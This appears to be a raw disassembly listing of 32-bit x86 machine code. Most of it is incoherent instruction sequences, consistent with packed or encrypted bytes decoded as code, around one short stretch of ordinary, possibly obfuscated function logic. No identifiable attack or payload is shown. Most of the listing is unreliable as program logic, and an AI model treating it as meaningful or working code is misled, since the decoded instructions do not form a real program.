  402918:	fadd   QWORD PTR [ebp+0x33254e44]
  40291e:	xor    al,0xed
  402920:	into   
  402921:	inc    esi
  402922:	jecxz  0x402936
  402924:	push   eax
  402925:	jecxz  0x402989
  402927:	mov    BYTE PTR [ebx-0x20],dl
  40292a:	leave  
  40292b:	data16 clc 
  40292d:	lahf   
  40292e:	ss inc esi
  402930:	jle    0x40294d
  402932:	add    al,0xdb
  402934:	jmp    0x845f:0x48c4caae
  40293b:	xchg   edx,eax
  40293c:	add    DWORD PTR [edx-0x2b2be33f],esi
  402942:	jg     0x4028f2
  402944:	fdivr  DWORD PTR [esi+0x76]
  402947:	data16 out dx,al
  402949:	enter  0x2aae,0x54
  40294d:	(bad)  [ecx]
  40294f:	fist   WORD PTR [edx+ebp*8+0x7c]
  402953:	or     DWORD PTR [eax],esi
  402955:	or     BYTE PTR [ecx],cl
  402957:	jns    0x4029ba
  402959:	xor    DWORD PTR [edi],0x15
  40295c:	jl     0x402991
  40295e:	in     eax,0x13
  402960:	pop    eax
  402961:	outs   dx,BYTE PTR ds:[esi]
  402962:	cmp    BYTE PTR [edx+ecx*2-0x6c],ah
  402966:	add    esp,DWORD PTR [ecx]
  402968:	jno    0x4029ba
  40296a:	dec    ebx
  40296b:	loopne 0x402992
  40296d:	xchg   ebp,eax
  40296e:	sub    eax,DWORD PTR [edx+0x6e]
  402971:	jbe    0x4028f8
  402973:	shl    BYTE PTR [edi+0x122466b],cl
  402979:	retf   0x7170
  40297c:	xor    al,0xd4
  40297e:	lea    ecx,[edx]
  402980:	lods   al,BYTE PTR ds:[esi]
  402981:	(bad)  
  402982:	fcom   QWORD PTR [edi+0x46431ce3]
  402988:	and    BYTE PTR [edx],dl
  40298a:	add    ebx,DWORD PTR ss:[edi+0x1932b9f1]
  402991:	and    dl,BYTE PTR [edi-0x739534a7]
  402997:	imul   BYTE PTR [ebx+edi*4-0x4e]
  40299b:	jno    0x402991
  40299d:	(bad)  
  40299e:	jb     0x402963
  4029a0:	int    0x16
  4029a2:	clc    
  4029a3:	xor    BYTE PTR [ecx-0x231c6b98],bh
  4029a9:	pop    ss
  4029aa:	dec    ecx
  4029ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4029ac:	push   ebp
  4029ad:	lds    ebp,FWORD PTR [esi+0x429fb90b]
  4029b3:	rcr    DWORD PTR [ecx+0x36],1
  4029b6:	retf   0x4321
  4029b9:	shr    DWORD PTR [ebx+edi*1-0x650ecce9],cl
  4029c0:	stos   DWORD PTR es:[edi],eax
  4029c1:	sub    DWORD PTR [edi-0x7604ca3c],esp
  4029c7:	dec    edi
  4029c8:	cmp    ebp,ebp
  4029ca:	adc    dh,BYTE PTR [esi-0xd]
  4029cd:	lock leave 
  4029cf:	sti    
  4029d0:	loope  0x402972
  4029d2:	adc    bl,BYTE PTR [esi+ecx*4-0x1]
  4029d6:	or     eax,0xb2e961b3
  4029db:	daa    
  4029dc:	div    BYTE PTR [esi-0x46]
  4029df:	and    eax,0xa921ac0c
  4029e4:	pushf  
  4029e5:	sti    
  4029e6:	xor    eax,0xade0f676
  4029eb:	jmp    0x402a65
  4029ed:	sbb    eax,0x19d76d80
  4029f2:	xchg   esi,eax
  4029f3:	fcmovne st,st(2)
  4029f5:	mov    ch,0x5e
  4029f7:	dec    ebx
  4029f8:	pop    edi
  4029f9:	ds jge 0x402a50
  4029fc:	mov    ds:0x7517c6d3,al
  402a01:	jne    0x4029e1
  402a03:	add    al,0x4b
  402a05:	xor    ebp,DWORD PTR [ebx]
  402a07:	sbb    esp,esi
  402a09:	add    cl,BYTE PTR cs:[edx-0x79efc353]
  402a10:	iret   
  402a11:	je     0x402a04
  402a13:	ds dec esi
  402a15:	jl     0x402a22
  402a17:	xchg   ebp,eax
  402a18:	xchg   BYTE PTR [edx+ebp*4],bh
  402a1b:	xlat   BYTE PTR ds:[ebx]
  402a1c:	xchg   esi,eax
  402a1d:	xchg   DWORD PTR [edx-0x7deeeaf5],edx
  402a23:	retf   
  402a24:	adc    BYTE PTR [edi],al
  402a26:	lock retf 
  402a28:	inc    ecx
  402a29:	mov    BYTE PTR [edi+ecx*1+0x75801ab],ah
  402a30:	es cmc 
  402a32:	adc    eax,0xd5f933b7
  402a37:	mov    ebx,0xad5ff6ca
  402a3c:	mov    DWORD PTR [ecx],esi
  402a3e:	dec    esp
  402a3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a40:	inc    ecx
  402a41:	add    ecx,0x9
  402a44:	lahf   
  402a45:	iret   
  402a46:	stc    
  402a47:	or     dh,BYTE PTR [ebx]
  402a49:	fist   WORD PTR [edi+eax*1+0x4d]
  402a4d:	(bad)  
  402a4f:	adc    dl,BYTE PTR [ebx]
  402a51:	inc    esp
  402a52:	jmp    0x402a64
  402a54:	sbb    BYTE PTR [edx],0xad
  402a57:	push   ds
  402a58:	jmp    0xd3fdb166
  402a5d:	inc    esi
  402a5e:	jnp    0x402ac4
  402a60:	in     eax,0xfb
  402a62:	push   ss
  402a63:	std    
  402a64:	outs   dx,BYTE PTR ds:[esi]
  402a65:	ret    
  402a66:	xchg   edx,eax
  402a67:	xchg   ecx,eax
  402a68:	js     0x402a0c
  402a6a:	(bad)  
  402a6b:	cli    
  402a6c:	add    DWORD PTR [esi-0x6d681d1],esi
  402a72:	jb     0x402a74
  402a74:	cwde   
  402a75:	mov    al,0xd6
  402a77:	dec    ebx
  402a78:	and    ecx,DWORD PTR [ecx+0x6]
  402a7b:	pushf  
  402a7c:	mov    al,0x26
  402a7e:	lock push esp
  402a80:	push   cx
  402a82:	inc    ebp
  402a83:	icebp  
  402a84:	add    ah,BYTE PTR [edx+0x3c85a029]
  402a8a:	mov    bl,0x57
  402a8c:	mov    al,0x8b
  402a8e:	add    eax,0x6736ff3d
  402a93:	out    0x45,eax
  402a95:	pop    ds
  402a96:	or     bh,BYTE PTR [edi]
  402a98:	xchg   edx,eax
  402a99:	jbe    0x402a28
  402a9b:	aad    0xbf
  402a9d:	xor    al,0x58
  402a9f:	xchg   ecx,eax
  402aa0:	mov    ecx,0xa88d0b24
  402aa5:	xchg   ebx,eax
  402aa6:	and    BYTE PTR [esi+0x30],dl
  402aa9:	cwde   
  402aaa:	push   edi
  402aab:	push   cs
  402aac:	push   ebp
  402aad:	lahf   
  402aae:	sub    al,0x97
  402ab0:	sub    eax,0x94fdea3
  402ab5:	gs fwait
  402ab7:	xchg   ecx,eax
  402ab8:	retf   0xf161
  402abb:	mov    dl,0xa3
  402abd:	add    dh,al
  402abf:	(bad)  
  402ac0:	addr16 xor eax,0x24cca897
  402ac6:	repz or eax,0x937af849
  402acc:	mov    esp,0xa1a8d7e0
  402ad1:	(bad)
  402ad4:	push   0x1d
  402ad6:	mov    ebx,DWORD PTR [eax-0x6e]
  402ad9:	sub    BYTE PTR [bp+si],bh
  402adc:	fs xchg ebp,eax
  402ade:	pop    edi
  402adf:	sub    cl,BYTE PTR [ebp+0x35a28d7f]
  402ae5:	jmp    0x402af9
  402ae7:	enter  0x172b,0x69
  402aeb:	(bad)  
  402aec:	adc    esi,eax
  402aee:	fadd   st,st(4)
  402af0:	retf   0xb251
  402af3:	mov    cl,0xe9
  402af5:	(bad)  
  402af6:	aaa    
  402af7:	push   ecx
  402af8:	sub    eax,0x55647828
  402afd:	imul   edi,DWORD PTR [ecx],0xffffffa9
  402b00:	xchg   esp,eax
  402b01:	sbb    ch,bl
  402b03:	aas    
  402b04:	stos   BYTE PTR es:[edi],al
  402b05:	shl    DWORD PTR [ebx+0x7d1dd96a],1
  402b0b:	out    0x22,eax
  402b0d:	pop    esp
  402b0e:	in     eax,dx
  402b0f:	sti    
  402b10:	ss mov esi,0x5bf4d71
  402b16:	inc    ebp
  402b17:	test   BYTE PTR [ebx],0xcd
  402b1a:	fs inc esp
  402b1c:	xchg   ecx,eax
  402b1d:	call   0x2ea5542b
  402b22:	jbe    0x402aff
  402b24:	lods   eax,DWORD PTR ds:[esi]
  402b25:	inc    esp
  402b26:	add    edx,DWORD PTR [ebx+0x31cc7cb1]
  402b2c:	mov    al,0x66
  402b2e:	or     ebx,ecx
  402b30:	retf   0x2c60
  402b33:	js     0x402b13
  402b35:	sub    ecx,DWORD PTR [ebp+0x19]
  402b38:	pop    edx
  402b39:	cmp    BYTE PTR [edx+0x491d82b8],dh
  402b3f:	push   ss
  402b40:	sbb    DWORD PTR [eax+0x63],eax
  402b43:	or     edi,ebx
  402b45:	sub    BYTE PTR [ecx-0x1a705b2b],al
  402b4b:	mov    bh,0x8b
  402b4d:	loop   0x402ae6
  402b4f:	outs   dx,BYTE PTR ds:[esi]
  402b50:	cmp    al,0x6e
  402b52:	ret    
  402b53:	mov    dl,0x59
  402b55:	or     ebp,esp
  402b57:	int    0xcf
  402b59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b5a:	fwait
  402b5b:	cmp    eax,0xa80ebec2
  402b60:	adc    al,0x8f
  402b62:	scas   al,BYTE PTR es:[edi]
  402b63:	ss call 0xd204465a
  402b69:	dec    eax
  402b6a:	sti    
  402b6b:	push   eax
  402b6c:	inc    ebx
  402b6d:	aam    0x63
  402b6f:	lods   eax,DWORD PTR ds:[esi]
  402b70:	out    dx,eax
  402b71:	or     eax,0xe1b5067e
  402b76:	das    
  402b77:	push   ds
  402b78:	mov    al,ds:0xd614e6ea
  402b7d:	push   ecx
  402b7e:	sbb    ecx,DWORD PTR [eax-0x53c7dad4]
  402b84:	jno    0x402bf5
  402b86:	fdivr  DWORD PTR [ebx-0x6cf70d9e]
  402b8c:	and    al,0x53
  402b8e:	fimul  DWORD PTR ds:0xe4bfa121
  402b94:	(bad)  
  402b96:	test   al,0x7
  402b98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402b99:	stos   DWORD PTR es:[edi],eax
  402b9a:	sub    DWORD PTR [ecx],eax
  402b9c:	inc    esi
  402b9d:	sbb    cl,al
  402b9f:	shl    ebp,1
  402ba1:	sahf   
  402ba2:	ret    0xb277
  402ba5:	xor    BYTE PTR [ecx],cl
  402ba7:	jae    0x402b64
  402ba9:	ja     0x402bd6
  402bab:	clc    
  402bac:	test   DWORD PTR [eax-0x5e],ecx
  402baf:	adc    edi,ecx
  402bb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402bb2:	pop    esp
  402bb3:	ds jge 0x402c0e
  402bb6:	add    al,0x90
  402bb8:	jne    0x402ba1
  402bba:	bnd ret 0xa92c
  402bbe:	jge    0x402c21
  402bc0:	xchg   edi,eax
  402bc1:	and    esi,DWORD PTR [ecx-0x28]
  402bc4:	ins    DWORD PTR es:[edi],dx
  402bc5:	daa    
  402bc6:	adc    DWORD PTR [ecx+0xa1f9d],esi
  402bcc:	cmp    BYTE PTR [edx+ebx*8],dl
  402bcf:	in     al,0xc9
  402bd1:	mov    cs,WORD PTR [edi]
  402bd3:	pop    ss
  402bd4:	cli    
  402bd5:	adc    eax,0xd0befa69
  402bda:	sahf   
  402bdb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402bdc:	addr16 push ss
  402bde:	xor    eax,0xf0b3cdde
  402be3:	cli    
  402be4:	(bad)  
  402be5:	sbb    al,0x4f
  402be7:	lea    eax,[edx-0x29]
  402bea:	rol    eax,0x49
  402bed:	int3   
  402bee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402bef:	(bad)  
  402bf0:	push   esi
  402bf1:	xchg   ebp,eax
  402bf2:	jp     0x402be6
  402bf4:	mov    ds:0x47f735c8,al
  402bf9:	jl     0x402bcd
  402bfb:	enter  0x6f1a,0x53
  402bff:	js     0x402bd4
  402c01:	in     al,dx
  402c02:	enter  0xd702,0x91
  402c06:	in     al,dx
  402c07:	xor    edx,DWORD PTR [edi+ecx*8]
  402c0a:	pop    ecx
  402c0b:	pop    es
  402c0c:	(bad)  
  402c0d:	xchg   edi,eax
  402c0e:	mov    ebx,0x257eb9b7
  402c13:	ret    
  402c14:	push   ss
  402c15:	push   edi
  402c16:	push   eax
  402c17:	push   0x335fe46b
  402c1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402c1d:	push   ebx
  402c1e:	push   edx
  402c1f:	mov    bl,0x52
  402c21:	add    eax,0xa68c562d
  402c26:	bound  eax,QWORD PTR [edx+0x5a]
  402c29:	xchg   ebx,eax
  402c2a:	or     al,0xeb
  402c2c:	rol    ecx,cl
  402c2e:	mov    ch,0x38
  402c30:	inc    edx
  402c31:	xchg   edx,eax
  402c32:	pop    eax
  402c33:	daa    
  402c34:	sbb    DWORD PTR [eax+0x4d7ebd96],edx
  402c3a:	stos   DWORD PTR es:[edi],eax
  402c3b:	sub    eax,DWORD PTR [ebx-0x6bd49557]
  402c41:	ja     0x402c6a
  402c43:	push   edi
  402c44:	repz mov ebx,0x829c6ec1
  402c4a:	call   0x6af7a7c4
  402c4f:	(bad)  
  402c50:	call   DWORD PTR [ebx+0x2ee1a563]
  402c56:	out    dx,al
  402c57:	rcl    BYTE PTR [eax+eax*2-0x63],cl
  402c5b:	sub    al,0xb
  402c5d:	out    0x78,al
  402c5f:	fsub   DWORD PTR [edi-0x5c]
  402c62:	jle    0x402c13
  402c64:	pushf  
  402c65:	mov    edi,0x2bdf448c
  402c6a:	cmp    al,0x6a
  402c6c:	dec    eax
  402c6d:	mov    DWORD PTR [ebp-0x5d],eax
  402c70:	inc    ebp
  402c71:	and    al,0x9e
  402c73:	sub    eax,0x823efba9
  402c78:	sbb    al,0xbe
  402c7a:	(bad)  
  402c7b:	mov    ebx,0xe877f9bc
  402c80:	(bad)  
  402c81:	in     al,0x6a
  402c83:	test   BYTE PTR [edi+0x50774db2],0xba
  402c8a:	jae    0x402c2b
  402c8c:	adc    eax,0x3c107c99
  402c91:	arpl   WORD PTR [ecx-0xb952063],di
  402c97:	cmp    esp,0x40110cac
  402c9d:	ficomp DWORD PTR [esp+ebx*2-0x7721ad47]
  402ca4:	or     bh,ch
  402ca6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ca7:	outs   dx,BYTE PTR ds:[esi]
  402ca8:	add    DWORD PTR [esi+0x47],0x98a3da30
  402caf:	adc    DWORD PTR [esi+edi*1+0x12cf85bf],edi
  402cb6:	out    0x7,eax
  402cb8:	push   es
  402cb9:	int    0x40
  402cbb:	xchg   BYTE PTR [eax-0x3d],dh
  402cbe:	xor    al,BYTE PTR ds:0xaa
  402cc4:	push   eax
  402cc5:	mov    eax,DWORD PTR [ebp-0x18]
  402cc8:	mov    eax,DWORD PTR [eax+0x198]
  402cce:	push   DWORD PTR [eax]
  402cd0:	call   0x40c099
  402cd5:	mov    DWORD PTR [ebp-0x4],eax
  402cd8:	cmp    DWORD PTR [ebp-0x4],0x0
  402cdc:	lea    eax,[ebp+0x4]
  402cdf:	mov    DWORD PTR [ebp-0x38],eax
  402ce2:	je     0x404656
  402ce8:	lea    eax,[ebp-0xc]
  402ceb:	mov    DWORD PTR [ebp-0x30],eax
  402cee:	mov    eax,DWORD PTR [ebp-0x4c]
  402cf1:	xor    eax,esi
  402cf3:	add    eax,edi
  402cf5:	mov    DWORD PTR [ebp-0x34],eax
  402cf8:	mov    eax,DWORD PTR [ebp-0x28]
  402cfb:	xor    eax,esi
  402cfd:	add    eax,edi
  402cff:	mov    DWORD PTR [ebp-0x20],eax
  402d02:	mov    eax,DWORD PTR [ebp-0x4]
  402d05:	mov    DWORD PTR [ebp-0x24],eax
  402d08:	lea    eax,[ebp-0x98]
  402d0e:	mov    DWORD PTR [ebp-0x8],eax
  402d11:	mov    eax,DWORD PTR [ebp-0x10]
  402d14:	mov    DWORD PTR [ebp-0x10],eax
  402d17:	mov    eax,DWORD PTR [ebp-0x1c]
  402d1a:	mov    DWORD PTR [ebp-0x40],ebx
  402d1d:	mov    DWORD PTR [ebp-0x2c],eax
  402d20:	mov    eax,DWORD PTR [ebp-0x40]
  402d23:	mov    ecx,DWORD PTR [ebp-0x8]
  402d26:	xor    eax,esi
  402d28:	add    eax,0x32729b
  402d2d:	jmp    0x40313b
  402d32:	stos   DWORD PTR es:[edi],eax
  402d33:	addr16 clc 
  402d35:	in     eax,0x50
  402d37:	loope  0x402dac
  402d39:	jno    0x402d4f
  402d3b:	jo     0x402d34
  402d3d:	cmp    ebp,DWORD PTR fs:0x998aba9
  402d44:	jle    0x402dc4
  402d46:	outs   dx,DWORD PTR ds:[esi]
  402d47:	jge    0x402dc7
  402d49:	jle    0x402da0
  402d4b:	test   BYTE PTR ds:0xb7d71d66,ah
  402d51:	in     al,0x48
  402d53:	popf   
  402d54:	jle    0x402d9f
  402d56:	mov    esp,fs
  402d58:	pop    edi
  402d59:	push   0x2117d3a9
  402d5e:	mov    ecx,0x843b39d6
  402d63:	jae    0x402ce9
  402d65:	leave  
  402d66:	adc    DWORD PTR [ebx+0xc5b7e2],ecx
  402d6c:	xchg   ebx,eax
  402d6d:	push   ds
  402d6e:	or     BYTE PTR [edx+0x63],al
  402d71:	inc    ebx
  402d72:	fwait
  402d73:	push   es
  402d74:	mov    BYTE PTR [esi-0x4d],dh
  402d77:	aas    
  402d78:	int3   
  402d79:	jns    0x402d13
  402d7b:	inc    ebx
  402d7c:	pop    ss
  402d7d:	loope  0x402d7d
  402d7f:	dec    ecx
  402d80:	sub    DWORD PTR [edx+edi*4-0x80],ebx
  402d84:	pop    ebx
  402d85:	cmp    edi,DWORD PTR [ecx]
  402d87:	xchg   esp,edx
  402d89:	int    0xa9
  402d8b:	push   eax
  402d8c:	mov    ds:0xb05ca3dd,eax
  402d91:	and    DWORD PTR ds:0xb9495577,esp
  402d97:	dec    ecx
  402d98:	inc    esp
  402d99:	pop    esp
  402d9a:	(bad)  
  402d9b:	into   
  402d9c:	jle    0x402d7b
  402d9e:	mov    ds:0xda27167d,eax
  402da3:	mov    eax,fs
  402da5:	pop    edi
  402da6:	popf   
  402da7:	dec    esi
  402da8:	xchg   edi,eax
  402da9:	fnstsw WORD PTR [esi-0x68]
  402dac:	mov    esi,0x5452b29f
  402db1:	fs es pop eax
  402db4:	cmc    
  402db5:	add    DWORD PTR [ebx+esi*2-0x25],ebx
  402db9:	int3   
  402dba:	out    0x26,eax
  402dbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402dbd:	or     eax,0x40913fc4
  402dc2:	js     0x402df8
  402dc4:	ret    
  402dc5:	mov    eax,DWORD PTR [ebx-0x508b7ac7]
  402dcb:	into   
  402dcc:	jno    0x402dde
  402dce:	sar    BYTE PTR ds:0x49dbece1,0xf2
  402dd5:	jg     0x402d73
  402dd7:	mov    BYTE PTR [edx+0x52c49557],ah
  402ddd:	icebp  
  402dde:	inc    esp
  402ddf:	adc    BYTE PTR [edx],0x4f
  402de2:	or     DWORD PTR [esi+0x6355fcb2],ecx
  402de8:	cmp    DWORD PTR [eax-0x36],edi
  402deb:	in     al,dx
  402dec:	shl    BYTE PTR [edi],0x87
  402def:	mov    bl,0xd6
  402df1:	dec    ebp
  402df2:	xor    eax,esp
  402df4:	or     BYTE PTR [edx+0x799f256f],cl
  402dfa:	fsub   DWORD PTR [edx-0x554f665a]
  402e00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e01:	add    edi,ebx
  402e03:	call   0x8c45:0x3aaff622
  402e0a:	arpl   WORD PTR [ebx+ebp*8],di
  402e0d:	dec    ebp
  402e0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e0f:	mov    edi,0xe0b854f9
  402e14:	(bad)  
  402e15:	stc    
  402e16:	fdivr  DWORD PTR [edx-0x51728d49]
  402e1c:	cmc    
  402e1d:	jg     0x402dd6
  402e1f:	adc    eax,0x94bec8db
  402e24:	and    DWORD PTR [ebx-0xb943732],esp
  402e2a:	and    BYTE PTR [esi-0x406abdec],al
  402e30:	xor    bl,BYTE PTR [ecx-0x78]
  402e33:	cmp    DWORD PTR [ebp-0x19],esi
  402e36:	fistp  QWORD PTR [ebp-0x25]
  402e39:	fidiv  DWORD PTR [edx-0x7bb6f65c]
  402e3f:	pop    esp
  402e40:	adc    al,0x94
  402e42:	inc    DWORD PTR [ebx*2+0x19dfa097]
  402e49:	or     esi,DWORD PTR [edi]
  402e4b:	ret    0x4156
  402e4e:	mov    ds:0xfbdcab38,al
  402e53:	adc    BYTE PTR [eax-0x3b],dl
  402e56:	jl     0x402eac
  402e58:	int    0x9c
  402e5a:	popf   
  402e5b:	xor    BYTE PTR [eax+0x41c96311],ah
  402e61:	pop    eax
  402e62:	add    BYTE PTR [ecx-0x24be1e4d],0xc3
  402e69:	adc    esi,DWORD PTR [edx+0x277a064]
  402e6f:	mov    ebx,0xd203ed62
  402e74:	pop    edi
  402e75:	and    eax,0x4f1803dc
  402e7a:	pusha  
  402e7b:	rcr    DWORD PTR [ecx],1
  402e7d:	sar    DWORD PTR ds:0xe6a5da58,cl
  402e83:	aad    0x6d
  402e85:	and    ah,BYTE PTR [edi+0x6471cc5b]
  402e8b:	aad    0x81
  402e8d:	mov    edx,0x27c14482
  402e92:	aad    0xca
  402e94:	add    dh,bh
  402e96:	sbb    ah,bl
  402e98:	idiv   BYTE PTR [eax-0x5d]
  402e9b:	test   ebp,ebp
  402e9d:	adc    DWORD PTR [esi-0x6b],esi
  402ea0:	leave  
  402ea1:	loop   0x402f1c
  402ea3:	test   al,0x74
  402ea5:	popa   
  402ea6:	inc    ebx
  402ea7:	mov    dh,0xae
  402ea9:	lahf   
  402eaa:	pop    esi
  402eab:	arpl   WORD PTR [esi+0x1c],cx
  402eae:	sub    al,0x9b
  402eb0:	jl     0x402e6f
  402eb2:	lods   al,BYTE PTR ds:[esi]
  402eb3:	adc    eax,DWORD PTR [edi]
  402eb5:	in     al,dx
  402eb6:	cwde   
  402eb7:	dec    ecx
  402eb8:	jns    0x402e68
  402eba:	mov    ecx,0x9d84c419
  402ebf:	stos   DWORD PTR es:[edi],eax
  402ec0:	jg     0x402e79
  402ec2:	scas   al,BYTE PTR es:[edi]
  402ec3:	xor    BYTE PTR [ebp-0x36776f51],ah
  402ec9:	hlt    
  402eca:	and    DWORD PTR [ebp-0x4fd16218],esi
  402ed0:	mov    ecx,0x8b0b8fb0
  402ed5:	fincstp 
  402ed7:	and    dh,BYTE PTR [edx]
  402ed9:	test   DWORD PTR [edx],edi
  402edb:	mov    ebp,0x4fd3c5be
  402ee0:	adc    DWORD PTR [edi],esi
  402ee2:	fcomp  DWORD PTR [edi]
  402ee4:	push   ss
  402ee5:	sub    edx,edi
  402ee7:	cld    
  402ee8:	inc    ebx
  402ee9:	lods   eax,DWORD PTR ds:[esi]
  402eea:	jge    0x402f09
  402eec:	ins    BYTE PTR es:[edi],dx
  402eed:	loopne 0x402f67
  402eef:	dec    esi
  402ef0:	aad    0x76
  402ef2:	cmp    BYTE PTR [ebp-0x71c53919],0x12
  402ef9:	mov    esp,0xa4f1ca78
  402efe:	clc    
  402eff:	adc    edi,ebx
  402f01:	cmc    
  402f02:	mov    ch,0xb
  402f04:	pop    esp
  402f05:	inc    ebp
  402f06:	push   es
  402f07:	test   eax,0x3dda7979
  402f0c:	push   eax
  402f0d:	scas   eax,DWORD PTR es:[edi]
  402f0e:	jno    0x402f69
  402f10:	xor    ecx,DWORD PTR [ecx+0x3c68a609]
  402f16:	sahf   
  402f17:	jne    0x402f28
  402f19:	mov    esp,0xf62a8673
  402f1e:	leave  
  402f1f:	ins    DWORD PTR es:[edi],dx
  402f20:	jmp    0xec60a6e1
  402f25:	add    eax,eax
  402f27:	(bad)  
  402f28:	cmp    edx,eax
  402f2a:	ss lahf 
  402f2c:	xchg   ebx,eax
  402f2d:	shl    DWORD PTR [eax+edx*2+0x6d8f1817],1
  402f34:	sbb    BYTE PTR [ebx+eax*2],al
  402f37:	ins    BYTE PTR es:[edi],dx
  402f38:	clc    
  402f39:	gs je  0x402edc
  402f3c:	fldenv [edx+0x378af86f]
  402f42:	stos   DWORD PTR es:[edi],eax
  402f43:	add    DWORD PTR [esi],edx
  402f45:	jecxz  0x402f5c
  402f47:	and    ecx,DWORD PTR [eax-0x27]
  402f4a:	fld    DWORD PTR [ecx-0x6a]
  402f4d:	pop    esp
  402f4e:	mov    esi,DWORD PTR [esi-0x31a2a130]
  402f54:	mov    dl,0x75
  402f56:	mov    ecx,0x494080de
  402f5b:	and    dh,BYTE PTR [edx-0x4a]
  402f5e:	xor    al,BYTE PTR [ecx+0x4cca16cc]
  402f64:	sub    DWORD PTR [ebx-0x458a17d7],edi
  402f6a:	pusha  
  402f6b:	retf   0x2dde
  402f6e:	mov    edx,0x430c6b28
  402f73:	sub    DWORD PTR [ebp+0x7c],ecx
  402f76:	shl    BYTE PTR [edx],0x2a
  402f79:	or     eax,0x136e80b7
  402f7e:	adc    eax,0x29789316
  402f83:	xchg   DWORD PTR [edx+0x30e746bf],eax
  402f89:	cwde   
  402f8a:	addr16 pop ecx
  402f8c:	add    DWORD PTR [edx-0x8],0xffffffa4
  402f90:	mov    ch,0xc5
  402f92:	popa   
  402f93:	clc    
  402f94:	and    eax,0x46a799d9
  402f99:	sbb    esp,ebp
  402f9b:	test   al,0x1d
  402f9d:	xlat   BYTE PTR ds:[ebx]
  402f9e:	mov    ah,0xe3
  402fa0:	rcl    ch,0xc1
  402fa3:	aas    
  402fa4:	and    DWORD PTR [eax],0x7530aaa8
  402faa:	sbb    al,0xc2
  402fac:	mov    ah,0x79
  402fae:	aas    
  402faf:	and    eax,0xbe6c1b89
  402fb4:	add    al,BYTE PTR [ebp+0x45]
  402fb7:	mov    dl,0xc1
  402fb9:	add    al,0x1
  402fbb:	xchg   esp,eax
  402fbc:	jle    0x402f62
  402fbe:	out    dx,eax
  402fbf:	fwait
  402fc0:	stos   BYTE PTR es:[edi],al
  402fc1:	fst    DWORD PTR [ecx+ecx*4-0x7293a46e]
  402fc8:	dec    edx
  402fc9:	nop
  402fca:	in     eax,0xb2
  402fcc:	iret   
  402fcd:	les    esi,FWORD PTR [eax+0x14]
  402fd0:	int    0xf6
  402fd2:	(bad)  
  402fd3:	ins    BYTE PTR es:[edi],dx
  402fd4:	push   esp
  402fd5:	test   DWORD PTR [edx],edi
  402fd7:	fldcw  WORD PTR [edi]
  402fd9:	lahf   
  402fda:	scas   al,BYTE PTR es:[edi]
  402fdb:	mov    eax,0x61e15753
  402fe0:	push   ecx
  402fe1:	repz scas al,BYTE PTR es:[edi]
  402fe3:	jmp    0x6e5f56b7
  402fe8:	mov    ebp,ebx
  402fea:	xchg   esp,eax
  402feb:	rol    DWORD PTR [ecx-0x4c],1
  402fee:	xor    dh,cl
  402ff0:	xchg   esi,eax
  402ff1:	adc    DWORD PTR [ebp+0x18],ebx
  402ff4:	mov    ebx,DWORD PTR [eax]
  402ff6:	cmp    edx,edx
  402ff8:	lahf   
  402ff9:	xor    BYTE PTR [ebp+0x51],al
  402ffc:	fisub  DWORD PTR [edx+edx*4]
  402fff:	or     ecx,DWORD PTR [esp+ebp*1]
  403002:	lock ror DWORD PTR [ebx],1
  403005:	push   esp
  403006:	gs and dh,ch
  403009:	sub    al,0x1f
  40300b:	sbb    BYTE PTR [eax-0x2c],cl
  40300e:	sub    BYTE PTR [ebp-0x36],bh
  403011:	iret   
  403012:	stc    
  403013:	shr    BYTE PTR [eax+0x37b86a7d],cl
  403019:	in     al,dx
  40301a:	mov    cl,0x26
  40301c:	sbb    eax,0x5c362d73
  403021:	pop    ecx
  403022:	push   es
  403023:	inc    eax
  403024:	push   0xdfcba3eb
  403029:	and    al,0x77
  40302b:	shr    DWORD PTR [ecx+0x13e6a89f],cl
  403031:	add    ch,BYTE PTR [edx-0x70b0d663]
  403037:	aas    
  403038:	repz add DWORD PTR [eax-0xb],eax
  40303c:	in     eax,0xaa
  40303e:	xor    DWORD PTR [edi+0xa],0x342960e
  403045:	imul   DWORD PTR [edx]
  403047:	xor    eax,0x876568bd
  40304c:	jns    0x402fe1
  40304e:	cmp    eax,0x4ac6f48c
  403053:	imul   esi,eax,0x79
  403056:	xor    BYTE PTR [ebp-0x49],0x66
  40305a:	sbb    al,BYTE PTR ds:0x7c4c2e39
  403060:	jb     0x4030a8
  403062:	lahf   
  403063:	push   ebx
  403064:	imul   ebx,ebx,0x11
  403067:	sub    ah,BYTE PTR [ecx-0x19]
  40306a:	(bad)  
  40306b:	(bad)  
  40306c:	(bad)  
  40306d:	xor    esi,DWORD PTR [eax+0x3c]
  403070:	mov    ah,0xa4
  403072:	mov    dl,0x44
  403074:	hlt    
  403075:	rcl    edx,0x18
  403078:	je     0x403031
  40307a:	fcomp  DWORD PTR [edx+eiz*1+0x1a]
  40307e:	or     DWORD PTR [ebx-0x7a3f18a8],eax
  403084:	data16 (bad) [esi-0xc]
  403088:	add    esi,DWORD PTR [ebx+esi*8+0xab848a7]
  40308f:	inc    edi
  403090:	sahf   
  403091:	int    0x79
  403093:	mov    ?,eax
  403095:	xchg   ecx,eax
  403096:	(bad)  
  403097:	xor    eax,0x8b43b37a
  40309c:	xor    DWORD PTR [esi+0x5a],esp
  40309f:	enter  0xe390,0x4f
  4030a3:	or     BYTE PTR [esi-0x61],dh
  4030a6:	fidiv  WORD PTR [edx-0x5cda865e]
  4030ac:	fild   WORD PTR [edx+ebp*1+0x4b]
  4030b0:	inc    ebp
  4030b1:	ror    BYTE PTR [ebx+0x57fcfecb],1
  4030b7:	gs cdq 
  4030b9:	sar    BYTE PTR [ebp-0x1f],cl
  4030bc:	dec    eax
  4030bd:	stos   DWORD PTR es:[edi],eax
  4030be:	outs   dx,BYTE PTR ds:[esi]
  4030bf:	mov    bh,0xf9
  4030c1:	dec    edx
  4030c2:	sub    BYTE PTR [eax-0x5baba32a],bl
  4030c8:	aaa    
